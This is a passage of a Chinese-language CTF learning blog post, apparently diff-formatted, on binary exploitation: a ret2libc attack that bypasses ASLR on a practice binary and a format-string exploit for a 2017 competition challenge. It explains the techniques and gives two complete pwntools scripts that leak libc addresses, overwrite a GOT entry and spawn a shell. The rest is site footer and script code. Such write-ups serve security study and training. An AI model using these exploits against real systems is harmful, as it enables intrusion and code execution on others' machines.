+<p>结果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/19.jpg" alt="6.jpg"></p>
+<h4 id="0x02-ret2libc-绕过ASLR-PIE"><a href="#0x02-ret2libc-绕过ASLR-PIE" class="headerlink" title="0x02 ret2libc(绕过ASLR/PIE)"></a>0x02 ret2libc(绕过ASLR/PIE)</h4><p>文件：还是level2<br>保护：ASLR NX<br>下面我们把系统ASLR/PIE防护开启：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 2 &gt;  /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/20.jpg" alt="figure"><br>这里就不能像上题那样将返回地址覆盖成libc库函数的地址了，因为每次执行libc的地址会有一定的偏移，但我们仍然能定位到libc库函数的地址。具体怎么做呢？<br>level2内的vulnerable_function()内调用read函数时，执行了call &lt;read@plt&gt;指令，plt是什么呢？<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/135685.html">这里</a>有详细的解释。文章内我只简单解释。。<br>我们先读取level2文件的elf结构：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/21.jpg" alt="figure"><br>发现.plt段在level2文件内，和程序段.text是分开的。<br>这里就不放图了，不知道为什么我step进call &lt;write@plt&gt;的时候直接跳到了write汇编程序地址，立个flag, 有空补上。<br>简单的说，plt是个跳转表 跳转到got表中read函数地址指针所在的区域，然后在got表内再跳转，最终才会跳转到write函数的地址。这种链接采用的是延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。（整个过程我也不是很清楚，如果你想深入了解还得多看看其他资料）。</p>
+<p>下面说说绕过ASLR/PIE的思路：<br>上文提到：调用libc库函数采用延迟绑定技术，执行第一个libc库函数时，libc才会链接到到level2，由于我们在vulnerable_function()中执行了read(),write()地址也就固定了。因此第一步是先获取到write函数真正的地址，记为write_addr。由于write()和system()在libc中的相对位置是固定的，也就是说它们之间的偏移量固定，因此我们就可以先事先获取偏移量，然后借助read函数作为跳板，就能得到system()的地址sys_addr了。同样的”/bin/sh”的地址也能固定，binsh_addr也出来了。<br>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 10003)</span></span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;vulfun= &#x27;</span> + <span class="built_in">hex</span>(vulfun_addr)</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">0x1</span>) +p32(got_write) + p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###sending payload1 ...###&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###receving write() addr...###&quot;</span></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr=&#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;</span></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n###sending payload2 ...###&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/22.jpg" alt="figure"></p>
+<h4 id="0x03格式化字符串漏洞"><a href="#0x03格式化字符串漏洞" class="headerlink" title="0x03格式化字符串漏洞"></a>0x03格式化字符串漏洞</h4><p>文件：pwne (2017湖湘杯pwn200赛题)<br>保护：ASLR NX<br>printf函数的格式化字符串常见的有 %d，%f，%c，%s（用于读取内存数据），%x（输出16进制数，前面没有0x），%p或%#x（输出16进制数，前面带有0x）；%n是一个不经常用到的格式符，它的作用是把前面已经打印的长度写入某个内存地址，用于修改内存，除了%n,还有%hn，%hhn，%lln，分别为写入目标空间4字节，2字节，1字节，8字节。</p>
+<p>综上，格式化字符可以分为两类：读取数据格式符和写入数据格式符。</p>
+<p>这里说一下，不是所有C编译器都支持%n, 我在windows上的codeblocks配的是C99标准的gcc编译器，执行无法靠%n写入数据，在这里我也有点迷惑，出题的人到底是用的什么编译器。。</p>
+<p>既然本地不一定能做到，那就用现成的题目文件吧。</p>
+<p>下面我们用这个文件看一下利用格式化字符串漏洞读取数据的方法：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.jpg" alt="figure"><br>我们看到，第七个%x取值是0x41414141, 也就是AAAA的ascii码，造成内存泄漏了。<br>解释：该文件GET YOUR NAME:后， 执行的是printf(str)。<br>也就是说，它把我们的输入当格式化字符串执行了。<br>我们%x取的其实是寄存器中的内容，寄存器里面又存什么呢？<br>是printf除格式化字符串外的参数，但是这里没有输入参数，也就是说，寄存器的内容其实是垃圾值。</p>
+<p>那又为什么在第七个%x取值位置输出了AAAA呢？<br>因为调用printf后，首先再把格式化字符串压栈，再把参数地址存进寄存器和栈中，再把所有能用的寄存器压栈，最后存进了个格式化字符串指针（用来指向格式化字符串地址，检索格式符），我这个ubuntu linux内寄存器地址加空白地址一共六个四字节空间，第七个取到的就是格式化字符串中的AAAA了。<br>栈图(网上找的)如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/23.png" alt="figure"><br>墨绿是寄存器地址，蓝色是空白位或者额外的存储参数空间，绿色是格式化字符串内容，橙色是格式化字符串指针。</p>
+<p>夸张的是，%x能泄露栈上高地址位的内容，%n的修改内存的功能，能将更改任意函数的调用。这两者结合简直无法无天。</p>
+<p>下面进入题目分析环节。。。：<br>IDA pro分析：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/24.jpg" alt="figure"><br>这道题了里，我们先利用%$7x(取第7个四字节数)， 返回puts函数链接后的地址。然后用%n改变atoi的调用，使它的调用地址指向system的函数地址（用偏移量算）,输入的age没经过类型检查，直接换成”/bin/sh”, 大功告成。<br>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwne&#x27;</span>)</span><br><span class="line"><span class="comment"># conn=remote(&#x27;ip&#x27;,port)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwne&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[Y/N]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;NAME:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + <span class="string">&#x27;%7$s&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;WELCOME \n&#x27;</span>)</span><br><span class="line">puts_addr=p.recv()[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line"><span class="comment"># print u32(put_addr)</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>] + u32(puts_addr)</span><br><span class="line">atoi_got_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">p.sendline(<span class="string">&#x27;17&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;[Y/N]\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;NAME:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(fmtstr_payload(<span class="number">7</span>, &#123;atoi_got_addr: system_addr&#125;))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;GET YOUR AGE:\n\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>效果如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/2020/03/07/%E5%85%A5%E9%97%A8pwn%E5%AE%9E%E8%B7%B5%E8%AE%B0%E5%BD%95/25.jpg" alt="figure"></p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+
+<div class="article-footer reveal fs14"></div>
+
+</article>
+
+
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body utterances'>
+      
+
+<svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg>
+
+<div id="utterances" repo="tonyshanc/blog-comments" issue-term="pathname" theme="github-light"></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs14">社交</span><a href="/">友链</a><a href="/">留言板</a><a href="/">Spotify</a><a href="/">Unsplash</a></div><div class="sitemap-group"><span class="fs14">更多</span><a href="/">关于本站</a><a href="/">GitHub</a><a href="/">GitLab</a></div></div><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="http://TonyShanc.github.io/">@shanah</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.2.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.2.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper/swiper-bundle.min.css","js":"https://unpkg.com/swiper/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function utterances(){
+    if(!document.getElementById("utterances"))return;
+    setTimeout(function() {
+      var checkUtterances = setInterval(function () {
+        var el = document.getElementById("utterances");
+        if (!el) return
+        clearInterval(checkUtterances)
+        try {
+          el.innerHTML="";
+        } catch (error) {}
+        var script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        const keys = ['repo', 'issue-term', 'issue-number', 'theme', 'label', 'crossorigin'];
+        keys.forEach((key, i) => {
+          if (el.attributes[key] && el.attributes[key].value) {
+            script.setAttribute(key, el.attributes[key].value);
+          }
+        });
+        el.appendChild(script);
+       }, 200)
+    });
+  }
+  utterances();
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+<div class="footer" style="font-size: 13px;width: 100%; position: fixed; left: 0; bottom: 0; z-index: -1; font-family: Oswald, sans-serif;font: 14px/1 'Microsoft Yahei',PingFangSC,Microsoft Sans Serif,sans-serif;    font-variant-ligatures: normal;    font-variant-caps: normal;    font-variant-numeric: normal;    font-variant-east-asian: normal;    font-weight: normal;    font-stretch: normal;    font-size: 14px;-webkit-font-smoothing: antialiased;text-rendering: optimizeLegibility;">
+  <div class="footer-wave" style="height: auto;">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 420"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,800L1380,800C1320,800,800,800,800,800C960,800,800,800,800,800C600,3800,800,800,800,800C240,800,800,800,800,800L0,800Z"></path></svg>
+  </div>
+</div>
+</html>
